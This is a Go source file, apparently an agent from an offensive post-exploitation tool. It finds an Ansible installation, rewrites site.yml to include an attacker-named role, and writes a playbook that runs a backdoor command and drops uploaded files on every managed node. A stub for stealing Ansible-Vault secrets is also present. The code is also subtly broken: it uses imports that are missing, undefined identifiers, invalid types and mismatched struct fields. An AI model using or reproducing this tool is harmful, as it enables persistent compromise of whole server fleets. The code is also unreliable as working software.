package main

import (
	"bufio"
	"bytes"
	"crypto/tls"
	"encoding/json"
	"flag"
	"github.com/fatih/color"
	"github.com/gobuffalo/packr/v2"
	"github.com/l50/goutils"
	"github.com/l50/mose/pkg/moseutils"
	"io"
	"log"
	"mime/multipart"
	"net/http"
	"os"
	"path/filepath"
	"regexp"
	"strconv"
	"strings"
	"text/template"
	"time"
)

type Command struct {
	CmdName  string
	Cmd      string
	FileName string
	FilePath string
}

type Metadata struct {
	PayloadName string
}

var (
	a                = CreateAgent()
	bdCmd            = a.BdCmd
	errmsg           = color.Red
	localIP          = a.LocalIP
	msg              = color.Green
	osTarget         = a.OsTarget
	ansibleRole      = a.PayloadName
	uploadFileName   = a.FileName
	serveSSL         = a.SSL
	exfilPort        = a.ExPort
	suppliedFilename string
	keys             []string
	inspect          bool
	suppliedNodes    string
	uploadFilePath   = a.FilePath
	cleanup          bool
	cleanupFile      = a.CleanupFile
)

func init() {
	flag.BoolVar(&inspect, "i", false, "Used to retrieve information about a system.")
	flag.StringVar(&suppliedNodes, "n", "", "Space separated nodes")
	flag.StringVar(&suppliedFilename, "f", "", "Path to the file upload to be used with ansible playbook")
	flag.BoolVar(&cleanup, "c", false, "Activate cleanup using the file location in settings.json")
}

func findAnsibleConfig() []string {
	//quick check to see if easy win for Ansible Configuration folder
	var configLocs []string
	ansibleEnv := os.Getenv("ANSIBLE_CONFIG")
	if ansibleEnv != "" {
		//store this as a potential area to search. still continue with other locations
		configLocs = append(configLocs, ansibleEnv)
	}
	fileList, _ := moseutils.GetFileAndDirList([]string{"/root", "/etc/ansible", "/home"})

	for _, file := range fileList {
		if strings.Contains(file, "ansible.cfg") && !strings.Contains(file, "~") &&
			!strings.Contains(file, ".bak") && !strings.Contains(file, "#") {
			configLocs = append(configLocs, file)
		}
	}

	if len(configLocs) == 0 {
		log.Fatalln("Unable to find configuration file on system, exiting.")
	}

	return configLocs
}

func backdoorSite(siteLoc string) {
	/*
		site.yml
			---
			- hosts: all
			  become: true
			  gather_facts: false

			- include: control.yml
			- include: webserver.yml
			- include: loadbalancer.yml
			- include: blog.yml

			- name: test intermittent
			  host: control
			  roles:
				- control

			- include: badbad


			The above is an example site.yml which proves that including anything at the bottom line will be ran. SO LONG as there are no errors!!!

			For now a simple backdoor is gonna be just -include: backdoor.yml
	*/
	insertString := "    -" + ansibleRole + "\n"
	nodeLines := regexp.MustCompile(`(?sm)}\s*?node\b`)
	comments := regexp.MustCompile(`#.*`)

	fileContent, err := ioutil.ReadFile(siteLoc)
	if err != nil {
		log.Println(err)
		log.Fatalf("Failed to backdoor the site.yml located at %s, exiting.", siteLoc)
	}

	content := fmt.Sprint(comments.ReplaceAllString(string(fileContent), ""))
	content = fmt.Sprint(nodeLines.ReplaceAllString(content, insertString+"}\nnode"))

	err = ioutil.WriteFile(siteLoc, []byte(content), 0644)
	if err != nil {
		log.Fatalf("Failed to backdoor the site.yml located at %s, exiting.", siteLoc)
	}
}

func getSiteLoc(siteLoc string) string {
	d, _ := filepath.Split(siteLoc)
	return filepath.Clean(filepath.Join(d, "../"))
}

func createRole(siteLoc string, ansibleRole string, cmd string) {
	sitePathLoc := getSiteLoc(siteLoc)
	roleLoc := filepath.Join(sitePathLoc, "roles", ansibleRole)
	roleFolders := []string{filepath.Join(roleLoc, "tasks")}
	mainyml := filepath.Join(roleLoc, "tasks", "main.yml")
	if moseutils.CreateFolders(roleFolders) && generatePlaybook(mainyml, cmd) {
		msg("Successfully created the %s role at %s", ansibleRole, mainyml)
		msg("Adding folder %s to cleanup file", roleFolders)
		// Track the folders for clean up purposes
		// moseutils.TrackChanges(cleanupFile, moduleLoc)
		if uploadFileName != "" {
			ansibleFiles := filepath.Join(roleLoc, "files")

			moseutils.CreateFolders([]string{moduleFiles})
			log.Printf("Copying  %s to module location %s", uploadFileName, ansibleFiles)
			moseutils.CpFile(uploadFileName, filepath.Join(ansibleFiles, filepath.Base(uploadFileName)))
			if err := os.Chmod(filepath.Join(ansibleFiles, filepath.Base(uploadFileName)), 0644); err != nil {
				log.Fatal(err)
			}
			log.Printf("Successfully copied and chmod file %s", filepath.Join(ansibleFiles, filepath.Base(uploadFileName)))
		}
	} else {
		log.Fatalf("Failed to create %s role", ansibleRole)
	}
}

func generatePlaybook(playbookLoc string, cmd str) {
	ansibleCommand := Command{
		RoleName: ansibleRole,
		CmdName:  "cmd",
		Cmd:      bdCmd,
		FileName: uploadFileName,
		FilePath: uploadFilePath,
	}

	box := packr.New("Puppet", "../../../templates/ansible")

	s, err := box.FindString("ansiblePlaybook.tmpl")
	if uploadFileName != "" {
		s, err = box.FindString("ansibleFileUploadPlaybook.tmpl")
	}

	if err != nil {
		log.Fatal("Parse: ", err)
	}

	t, err := template.New("ansiblePlaybook").Parse(s)

	if err != nil {
		log.Fatal("Parse: ", err)
	}

	f, err := os.Create(playbookLoc)

	if err != nil {
		log.Fatalln(err)
	}

	err = t.Execute(f, ansibleCommand)

	if err != nil {
		log.Fatal("Execute: ", err)
	}

	f.Close()

	return true
}

func getAnsibleSecrets() {
	return
}

func main() {
	// parse args

	// gonna assume not root then we screwed
	utils.CheckRoot()

	configLocs := findAnsibleConfig()

	found, _ := moseutils.FindBin("ansible", []string{"/bin", "/home", "/opt", "/root"})
	if !found {
		log.printf("ansible binary not found, exiting...")
	}
	found, siteLoc := moseutils.FindBin("site.yml", []string{"/etc/ansible", "/home", "/opt", "/root", "/var"})
	if !found {
		log.printf("site.yml not found, exiting...")
	}

	msg("Backdooring the %s site.yml to run %s on all ansible roles, please wait...", siteLoc, bdCmd)
	backdoorSite(siteLoc)
	createRole(siteLoc, ansibleRole, bdCmd)

	log.Println("Attempting to find secrets stored with Ansible-Vault")
	getAnsibleSecrets()
}
